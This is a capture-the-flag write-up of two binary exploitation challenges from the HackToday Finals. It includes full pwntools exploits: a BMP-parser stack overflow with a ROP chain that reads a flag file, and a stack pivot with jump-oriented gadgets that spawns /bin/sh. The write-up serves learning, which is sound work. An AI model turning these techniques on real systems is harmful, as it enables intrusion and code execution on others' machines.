# HackToday Finals

{% hint style="info" %}
Team: <mark style="color:blue;">**girls band cry**</mark>

Rank: <mark style="color:yellow;">3rd</mark> / <mark style="color:yellow;">10</mark>&#x20;
{% endhint %}

<table><thead><tr><th width="297">Challenge</th><th width="349">Category</th><th data-hidden align="center">Points</th></tr></thead><tbody><tr><td>stegoscan <a href="https://www.google.com/url?sa=t&#x26;rct=j&#x26;q=&#x26;esrc=s&#x26;source=web&#x26;cd=&#x26;ved=2ahUKEwipnK3D-ZSHAxV69zgGHdccDGEQFnoECBkQAQ&#x26;url=https%3A%2F%2Femojipedia.org%2F1st-place-medal&#x26;usg=AOvVaw2gpojp7kMgKRfm7JKtQhyE&#x26;opi=89978449">🥇</a></td><td>Binary Exploitation</td><td align="center">100 pts</td></tr><tr><td>yqroo wants a job</td><td>Binary Exploitation</td><td align="center">469 pts</td></tr></tbody></table>

## stegoscan [🥇](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&ved=2ahUKEwipnK3D-ZSHAxV69zgGHdccDGEQFnoECBkQAQ\&url=https%3A%2F%2Femojipedia.org%2F1st-place-medal\&usg=AOvVaw2gpojp7kMgKRfm7JKtQhyE\&opi=89978449)

### Analysis

given a binary called `stegoscan`,  first lets check its type and security mechanism

```python
└──╼ [★]$ file stegoscan
stegoscan: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=984429b7f4d456663e5c4dbd7050a337e0530bbb, for GNU/Linux 3.2.0, not stripped
└──╼ [★]$ pwn checksec stegoscan
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

luckily the author is kind enough to provide the source code:

{% code title="stegoscan.c" %}
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define MIN_IMGSIZE 400 // 20x20
#define MAX_IMGSIZE 900 // 30x30

#define TRIGGER_SIZE 15
uint8_t trigger[] = "hanasuru's-fans";

typedef struct {
  char signature[2];
  uint32_t fileSize;
  uint32_t reserved;
  uint32_t dataOffset;
  uint32_t headerSize;
  int32_t width;
  int32_t height;
  uint16_t colorPlanes;
  uint16_t bitsPerPixel;
  uint32_t compression;
  uint32_t imageSize;
  int32_t horizontalResolution;
  int32_t verticalResolution;
  uint32_t numColors;
  uint32_t importantColors;
} BMPFile;

void error(const char *error) {
  printf("ERROR: %s\n", error);
  exit(-1);
}

BMPFile *loadBitmap(FILE *file) {
  BMPFile *bmp = (BMPFile *)malloc(sizeof(BMPFile));
  if(bmp == NULL)
    error("Bitmap struct heap allocation failed.");

	// Read file headers
	fread(&bmp->signature, sizeof(char), 2, file);
	fread(&bmp->fileSize, sizeof(uint32_t), 1, file);
	fread(&bmp->reserved, sizeof(uint32_t), 1, file);
	fread(&bmp->dataOffset, sizeof(uint32_t), 1, file);
	fread(&bmp->headerSize, sizeof(uint32_t), 1, file);
	fread(&bmp->width, sizeof(int32_t), 1, file);
	fread(&bmp->height, sizeof(int32_t), 1, file);
	fread(&bmp->colorPlanes, sizeof(uint16_t), 1, file);
	fread(&bmp->bitsPerPixel, sizeof(uint16_t), 1, file);
	fread(&bmp->compression, sizeof(uint32_t), 1, file);
	fread(&bmp->imageSize, sizeof(uint32_t), 1, file);
	fread(&bmp->horizontalResolution, sizeof(int32_t), 1, file);
	fread(&bmp->verticalResolution, sizeof(int32_t), 1, file);
	fread(&bmp->numColors, sizeof(uint32_t), 1, file);
	fread(&bmp->importantColors, sizeof(uint32_t), 1, file);

  // signature bytes check
  if(bmp->signature[0] != 'B' || bmp->signature[1] != 'M')
    error("Invalid file signature.");

  // min-max size check
  if(bmp->imageSize < MIN_IMGSIZE || bmp->imageSize > MAX_IMGSIZE)
    error("Invalid bitmap size. The acceptaple resolution range is 20x20 to 30x30.");

  // square bitmap check
  if(bmp->width != bmp->height)
    error("Invalid bitmap resolution. Only square bitmaps are processed.");

  return bmp;
}

int sequenceDetected(const uint8_t *arr, uint32_t size) {
  for(int i=0; i<(size-TRIGGER_SIZE + 1); ++i) {
    if(memcmp(arr+i, trigger, TRIGGER_SIZE) == 0)
      return 1;
  }
  return 0;
}


void scan(const uint8_t *bitmap, uint32_t dim) {
  for(int i = 0; i < dim; ++i) {
    printf("[%02d] : ", i + 1);
    if(sequenceDetected(bitmap+(i * dim), dim))
      printf("FAIL\n");
    else
      printf("PASS\n");
  }
}

int main(int argc, char **argv) {
  if(argc < 2)
    error("No file provided as an argument.");

  size_t len = strlen(argv[1]);
  if(len >= 4 && strcmp(argv[1]+len-4, ".bmp"))
    error("Invalid file extension. Only accepting .bmp files.");

  FILE *file = fopen(argv[1], "rb");
  if(file == NULL)
    error("Failed to open file.");

  BMPFile *bmp = loadBitmap(file);

  fseek(file, bmp->dataOffset, SEEK_SET);

  uint8_t pixelBuf[bmp->imageSize];

  int c = 0, i = 0;
  while((c = fgetc(file)) != EOF)
    pixelBuf[i++] = (uint8_t)c;

  scan(pixelBuf, bmp->width);

  fclose(file);
  return 0;
}

__attribute__((constructor))
void setup(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}
```
{% endcode %}

the gist of the program is that it will parse a `.bmp` file and does an egghunt for the string "hanasuru's-fans" within the data.

we're also given a `dummy.bmp` to test the program's functionality

<figure><img src="../../.gitbook/assets/image (225).png" alt="" width="230"><figcaption></figcaption></figure>

looking through this [blog](http://www.ue.eti.pg.gda.pl/fpgalab/zadania.spartan3/zad_vga_struktura_pliku_bmp_en.html) I understand a bit more of the `.bmp` format:

<figure><img src="../../.gitbook/assets/image (236).png" alt="" width="359"><figcaption></figcaption></figure>

as we can see the, the program parses all of the 4 section but the `ColorTable` section (thankfully by the author to reduce complexity hehe)

next, the program does some validation, such as:

* signature check

```c
  if(bmp->signature[0] != 'B' || bmp->signature[1] != 'M')
    error("Invalid file signature.");
```

* minimum and maximum size

```c
  if(bmp->imageSize < MIN_IMGSIZE || bmp->imageSize > MAX_IMGSIZE)
    error("Invalid bitmap size. The acceptaple resolution range is 20x20 to 30x30.");
```

* dimension

```c
  if(bmp->width != bmp->height)
    error("Invalid bitmap resolution. Only square bitmaps are processed.");
```

the vulnerability lies here:

```c
  fseek(file, bmp->dataOffset, SEEK_SET);

  uint8_t pixelBuf[bmp->imageSize];

  int c = 0, i = 0;
  while((c = fgetc(file)) != EOF)
    pixelBuf[i++] = (uint8_t)c;
```

the `pixelBuf` array is initialized with the size of `imageSize`, however `fgetc` reads until `EOF` .

`imageSize` is just a variable within the `.bmp` format and can be set arbitrarily without having to be the same as the actual `.bmp` size. this means it's possible to have the `RasterData`'s size data section bigger than what is specified in `imageSize`. thus enabling a buffer overflow.

### Exploitation

this type of challenge is called a one shot since we can only interact with the binary once and give our payload input only once, rather different than the usual heap CRUD if you're familiar with it where you can interact with it multiple times.

considering the binary is statically linked with no pie and canary, a one shot here is definitely feasible relatively easy.

to start with, let's create a function to craft our payload according to the `.bmp` format we saw before

```python
def build_bmp(signature=b'BM', fileSize=0, reserved=0, dataOffset=54, headerSize=40, width=30, height=30, colorPlanes=1,bitsPerPixel=24, compression=0, imageSize=500, horizontalResolution=2835, verticalResolution=2835, numColors=0, importantColors=0, RasterData=None):
              pass              
```

next we'll make sure for the checks mentioned above are satisfied

```python
# challenge specific checks
if imageSize < MIN_IMGSIZE:
    raise ValueError('Image size is too small')
if imageSize > MAX_IMGSIZE:
    raise ValueError('Image size is too large')
if width != height:
    raise ValueError('Only square images are supported')
```

next we'll format the `Header` and `InfoHeader` sections

```python
# Pack BMP header (14 bytes)
bmp_header = struct.pack('<2sIHHI', signature, fileSize, reserved, reserved, dataOffset)

# Pack DIB header (40 bytes)
dib_header = struct.pack('<IIIHHIIIIII', headerSize, width, height, colorPlanes, bitsPerPixel,compression, imageSize, horizontalResolution, verticalResolution, numColors, importantColors)
```

next, we'll combine all the section plus the raw `RasterData` which will contain our payload

```python
bmp_data = bmp_header + dib_header + RasterData
return bmp_data
```

next to test if we can control execution's flow, we'll send the usual cyclic payload

```python
payload = cyclic(600)
with open(exploit_bmp, "wb") as f:
    f.write(build_bmp(
        width=20,
        height=20,
        imageSize=400,
        dataOffset=66,
        RasterData=payload
))
```

however after a few run, most of the time it crashes because of a pointer dereference, I'm not sure why and what part causes it, but I decided to not care about it.

the time it succeded we get the offset of 488

<figure><img src="../../.gitbook/assets/image (227).png" alt="" width="375"><figcaption></figcaption></figure>

due to the unreliableness, I decided to test it a few more times and found out that there would be occurrences where the offset will be different such as follow

<figure><img src="../../.gitbook/assets/image (228).png" alt="" width="375"><figcaption></figcaption></figure>



to accomodate for it, at the start of the payload I sprayed a bunch of `ret` gadget to act as a ret slep.

```python
payload += flat({
        0: [
            p64(RET) * 10, # ret slep, some brute needed, just upload the same generated payload again
            # ... snippet           
        ]
    })

```

next, I'll use the exact same method and gadget I explained in my previous [writeup](https://hyggehalcyon.gitbook.io/page/ctfs/2024/bsidessf-ctf#exploitation-1) to write the string path to flag.txt

```python
payload += flat({
        0: [
            # ... snippet 
            mov(pivot, u64(b'/home/ctf/flag.txt'[0:8])),
            mov(pivot+8, u64(b'/home/ctf/flag.txt'[8:16])),
            mov(pivot+16, u64(b'xt'.ljust(8, b'\x00'))),
            # ... snippet          
        ]
    })
```

and the rest of the payload would be the usual ORW.&#x20;

the reason why I didn't decide to execve and spawn a shell is because the challenge is interfaced through a website where we would upload a `.bmp` and it will then ran againts the program, then the output will be given back to us.&#x20;

here's the final payload being given to the site:

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

below is the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *
import struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './challenge/stegoscan'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'http://103.226.139.23:1337', 1337
exploit_bmp = './exploit.bmp'

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + [exploit_bmp], gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + [exploit_bmp])

gdbscript = '''
init-pwndbg

# main's ret
break *0x401e2e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> !file ./challenge/stegoscan
# ./challenge/stegoscan: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=984429b7f4d456663e5c4dbd7050a337e0530bbb, for GNU/Linux 3.2.0, not stripped
# └──╼ [★]$ pwn checksec challenge/stegoscan 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

# http://www.ue.eti.pg.gda.pl/fpgalab/zadania.spartan3/zad_vga_struktura_pliku_bmp_en.html

MIN_IMGSIZE = 400
MAX_IMGSIZE = 900

def build_bmp(signature=b'BM', fileSize=0, reserved=0, dataOffset=54,
              headerSize=40, width=30, height=30, colorPlanes=1,
              bitsPerPixel=24, compression=0, imageSize=500,
              horizontalResolution=2835, verticalResolution=2835,
              numColors=0, importantColors=0, RasterData=None):

    # challenge specific checks
    if imageSize < MIN_IMGSIZE:
        raise ValueError('Image size is too small')
    if imageSize > MAX_IMGSIZE:
        raise ValueError('Image size is too large')
    if width != height:
        raise ValueError('Only square images are supported')

    # Pack BMP header (14 bytes)
    bmp_header = struct.pack('<2sIHHI', signature, fileSize, reserved, reserved, dataOffset)

    # Pack DIB header (40 bytes)
    dib_header = struct.pack('<IIIHHIIIIII', headerSize, width, height, colorPlanes, bitsPerPixel,
                             compression, imageSize, horizontalResolution, verticalResolution,
                             numColors, importantColors)

    bmp_data = bmp_header + dib_header + RasterData
    return bmp_data

MOV_RDX_TO_PTR_RSI = 0x0000000000488cea
POP_RAX = 0x0000000000450847
POP_RDI = 0x000000000040253f
POP_RDX_RBX = 0x00000000004868eb
POP_RSI = 0x000000000040a5ae
SYSCALL =  0x00000000004022f4
RET = 0x000000000040101a

def mov(where, what):
    return flat([
        POP_RDX_RBX,
        what,
        0x0,
        POP_RSI,
        where,
        MOV_RDX_TO_PTR_RSI
    ])

def exploit():
    global io
    rop = ROP(elf)

    SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]

    pivot = elf.bss() + 0x200
    payload = cyclic(448) + p64(pivot) #+ cyclic(400) # can be 0 or 32 
    payload += flat({
        0: [
            p64(RET) * 10, # ret slep, some brute needed, just upload the same generated payload again
            mov(pivot, u64(b'/home/ctf/flag.txt'[0:8])),
            mov(pivot+8, u64(b'/home/ctf/flag.txt'[8:16])),
            mov(pivot+16, u64(b'xt'.ljust(8, b'\x00'))),

            POP_RDI,
            pivot,
            POP_RSI,
            0,
            POP_RDX_RBX,
            0,
            0,
            POP_RAX,
            2,
            SYSCALL,

            POP_RDI,
            3,
            POP_RSI,
            pivot,
            POP_RDX_RBX,
            0x40,
            0,
            POP_RAX,
            0,
            SYSCALL,

            POP_RDI,
            1,
            POP_RAX,
            1,
            SYSCALL            
        ]
    })

    with open(exploit_bmp, "wb") as f:
        f.write(build_bmp(
            width=20,
            height=20,
            imageSize=400,
            dataOffset=66,
            RasterData=payload
    ))

    io = initialize()

    log.success("pivot: %#x", pivot)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

## yqroo wants a job

### Analysis

we're given another binary this time with no source code

```python
└──╼ [★]$ file vuln 
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
└──╼ [★]$ pwn checksec vuln 
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
```

the binary itself is made out of assembly

<figure><img src="../../.gitbook/assets/image (229).png" alt="" width="563"><figcaption></figcaption></figure>

seeing the other sections in ghidra I noticed a suspicious part

<figure><img src="../../.gitbook/assets/image (230).png" alt="" width="548"><figcaption></figcaption></figure>

turns out it's a bunch of gadgets

```asm6502
pwndbg> x/40i 0x401000                     
   0x401000:    pop    rbx                 
   0x401001:    pop    rsp    
   0x401002:    pop    rdi    
   0x401003:    pop    rdx                 
   0x401004:    pop    rsi                                                            
   0x401005:    pop    rcx                 
   0x401006:    jmp    QWORD PTR [rsi-0x25]
   0x401009:    add    rdx,rcx             
   0x40100c:    jmp    QWORD PTR [rdx-0x45]
   0x40100f:    nop           
   0x401010:    nop           
   0x401011:    jmp    QWORD PTR [rcx-0x11]
   0x401014:    add    eax,edi
   0x401016:    jmp    QWORD PTR [rcx]                                                                   
   0x401018:    pop    rbx                 
   0x401019:    jmp    QWORD PTR [rcx+0x47]
   0x40101c:    jmp    QWORD PTR [rsp-0x64]
   0x401020:    xor    rdx,rdx
   0x401023:    add    rcx,rax
   0x401026:    xor    rbx,rcx
   0x401029:    jmp    rbx                
   0x40102b:    add    rcx,QWORD PTR [rsp+0x18]                                                                                         
   0x401030:    jmp    QWORD PTR [rdx-0x1d]
   0x401033:    sub    rsi,rbx
   0x401036:    jmp    QWORD PTR [rcx] 
   0x401038:    xchg   rsi,rdi        
   0x40103b:    fwait                               
   0x40103c:    sub    rax,rcx                      
   0x40103f:    jmp    QWORD PTR [rdi+0xb]          
   0x401042:    mul    bl                           
   0x401044:    nop                                 
   0x401045:    stc                                 
   0x401046:    xchg   rcx,rdx                      
   0x401049:    jmp    QWORD PTR [rcx]              
   0x40104b:    push   rsp                          
   0x40104c:    mov    dx,0x8                                       
   0x401050:    inc    dil                                          
   0x401053:    mov    rsi,rsp                                      
   0x401056:    inc
```

running the program, it wil give a stack leak which is the address where our buffer starts&#x20;

<figure><img src="../../.gitbook/assets/image (231).png" alt="" width="563"><figcaption></figcaption></figure>

### Exploitation

so the goal is quite simple, we have a buffer overflow and somehow we need to chain the gadgets to achieve code execution.

first thing to note is that the program doesn't return but rather jump

```asm6502
0040106d ff 24 24        JMP        qword ptr [RSP]=>local_8
```

let's do the basic cyclic test with `cyclic(0x200)`

<figure><img src="../../.gitbook/assets/image (232).png" alt="" width="548"><figcaption></figcaption></figure>

as you can see, our payload overflowed 16 bytes in total, with the first 8 bytes being the address where we want to jump.&#x20;

this is relevant because notice in our gadget we have bunch of pop gadgets but they will be no use if we can't control what's being popped.&#x20;

in order to call execve, we need to control RAX, RSI, RSI and RDX. after a bit of thought and trial error, two of these gadget are enough:

* Gadget 1:

```asm6502
   0x401000:    pop    rbx    
   0x401001:    pop    rsp                                                                                                                                                      
   0x401002:    pop    rdi
   0x401003:    pop    rdx
   0x401004:    pop    rsi
   0x401005:    pop    rcx
   0x401006:    jmp    QWORD PTR [rsi-0x25]
```

* Gadget 2:              &#x20;

```asm6502
   0x40103c:    sub    rax,rcx
   0x40103f:    jmp    QWORD PTR [rdi+0xb]
```

through the first gadget, we will able to control all of the registers but RAX, which will be controlled through the second gadget.&#x20;

do notice that we can control RAX in the second gadget if we are able to control RCX in the first gadget.

first since the overflow is not enough to fully utilize the pop gadgets, we will need to do a stack pivot to the start of our payload. to do this let's calculate the offset from the leaked stack address

<figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

```python
    payload = cyclic(99)
    payload += flat([
        0x401000,               # will go to rbx
        (stack-0x6b)
    ])
```

with that we're able to control RDX, RDI and RSI

<figure><img src="../../.gitbook/assets/image (234).png" alt="" width="375"><figcaption></figcaption></figure>

next we'll discuss what to set those register with&#x20;

* RDX

this is quite meaningless so we'll set it to NULL

* RSI

RSI is quite important as it is how we'll able to chain to the next gadget, it has to contain an address which contain a pointer to our next gadget as it is a jump dereference

```asm6502
0x401006:    jmp    QWORD PTR [rsi-0x25]
```

* RDI

same as RSI, however this is chained in our second gadget:&#x20;

```asm6502
0x40103f:    jmp    QWORD PTR [rdi+0xb]
```

the target where we wanna jump to is of course, the syscall call.

* RCX

RCX is relevant because it's what's will control RAX in the second gadget:

```asm6502
0x40103c:    sub    rax,rcx
```

in the last screenshot, RAX was 0x73 thus to achieve RAX = 0x3b, RCX must be 0x38

combining all our payload now would be:

```python
    payload = b''
    payload += flat([
        stack-0x4b+0x8-0xb,     # rdi (start of  (stack-0x6b)) also points to -> &(0x40105a)
        0x0,                    # rdx
        stack-0x4b+0x25,        # rsi -> points to &(0x40103c)
        0x38,                   # rcx
        0x40103c,               # is *(stack-0x4b+0x25), i.e. target for `jmp QWORD PTR [rsi-0x25]`
        0x40105a,               # is target for `jmp QWORD PTR [rdi+0xb]`
    ])
    payload += b'\x00' * (99-len(payload))
    payload += flat([
        0x401000,               # will go to rbx
        (stack-0x6b)
    ])
    io.send(payload)
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

and we're able to hit execve, one small thing is that now RDI points to memory that contains one of our address, we can simply fix this by adjusting the offset where our pointer and the /bin/sh is located

```python
    payload = b''
    payload += flat([
        stack-0x4b+0x18-0x4-0xb,# rdi (start of  (stack-0x6b)) also points to -> &(0x40105a)
        0x0,                    # rdx
        stack-0x4b+0x25,        # rsi -> points to &(0x40103c)
        0x38,                   # rcx
        0x40103c,               # is *(stack-0x4b+0x25), i.e. target for `jmp QWORD PTR [rsi-0x25]`
    ])
    payload += b'\x00/bin/sh'
    payload += p32(0x0) + p32(0x40105a)
    payload += b'\x00' * (99-len(payload))
    payload += flat([
        0x401000,               # will go to rbx
        (stack-0x6b)
    ])
```

and thus pwned

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

here's the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *
from subprocess import run

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.226.139.23', 31337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x040106d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ file vuln 
# vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
# ┌─[192.168.83.128]─[halcyon@parrot]─[~/SharedFolder/finals/yqroo wants a job]
# └──╼ [★]$ pwn checksec vuln 
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX unknown - GNU_STACK missing
#     PIE:      No PIE (0x400000)
#     Stack:    Executable

# gadgets:
# pwndbg> x/40i 0x401000                                                                                                                                                                                                                                                          
#    0x401000:    pop    rbx    
#    0x401001:    pop    rsp                                                                                                                                                      
#    0x401002:    pop    rdi
#    0x401003:    pop    rdx
#    0x401004:    pop    rsi
#    0x401005:    pop    rcx
#    0x401006:    jmp    QWORD PTR [rsi-0x25]

#    0x401009:    add    rdx,rcx
#    0x40100c:    jmp    QWORD PTR [rdx-0x45]

#    0x40100f:    nop           
#    0x401010:    nop                        
#    0x401011:    jmp    QWORD PTR [rcx-0x11]

#    0x401014:    add    eax,edi
#    0x401016:    jmp    QWORD PTR [rcx]     

#    0x401018:    pop    rbx    
#    0x401019:    jmp    QWORD PTR [rcx+0x47]

#    0x40101c:    jmp    QWORD PTR [rsp-0x64]

#    0x401020:    xor    rdx,rdx             
#    0x401023:    add    rcx,rax             
#    0x401026:    xor    rbx,rcx
#    0x401029:    jmp    rbx    
#    0x40102b:    add    rcx,QWORD PTR [rsp+0x18]                                                                                         
#    0x401030:    jmp    QWORD PTR [rdx-0x1d]

#    0x401033:    sub    rsi,rbx                                                          
#    0x401036:    jmp    QWORD PTR [rcx]     

#    0x401038:    xchg   rsi,rdi
#    0x40103b:    fwait                 
#    0x40103c:    sub    rax,rcx
#    0x40103f:    jmp    QWORD PTR [rdi+0xb]

#    0x401042:    mul    bl     
#    0x401044:    nop                       
#    0x401045:    stc      
#    0x401046:    xchg   rcx,rdx
#    0x401049:    jmp    QWORD PTR [rcx]

def exploit():
    global io

    io = initialize()
    stack = u64(io.recv(8))

    payload = b''
    payload += flat([
        stack-0x4b+0x18-0x4-0xb,# rdi (start of  (stack-0x6b)) also points to -> &(0x40105a)
        0x0,                    # rdx
        stack-0x4b+0x25,        # rsi -> points to &(0x40103c)
        0x38,                   # rcx
        0x40103c,               # is *(stack-0x4b+0x25), i.e. target for `jmp QWORD PTR [rsi-0x25]`
    ])
    payload += b'\x00/bin/sh'
    payload += p32(0x0) + p32(0x40105a)
    payload += b'\x00' * (99-len(payload))
    payload += flat([
        0x401000,               # will go to rbx
        (stack-0x6b)
    ])
    io.send(payload)

    log.success('stack: %#x', stack)
    log.success('new rsp: %#x', stack-0x6b)
    io.interactive()
    
if __name__ == '__main__':
    exploit()

```
{% endcode %}
